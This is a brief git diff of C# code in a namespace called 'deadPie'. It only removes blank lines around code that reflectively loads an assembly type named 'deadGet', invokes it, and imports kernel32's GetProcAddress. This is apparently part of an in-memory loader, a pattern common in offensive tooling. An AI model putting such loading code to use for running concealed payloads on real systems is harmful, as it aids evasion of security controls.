@@ -22,9 +22,7 @@ namespace deadPie
             var type = asm.GetType("deadGet.deadGet");
             var instance = Activator.CreateInstance(type);
             type.InvokeMember("deadGet", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
-
         }
-
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         [DllImport("kernel32")]
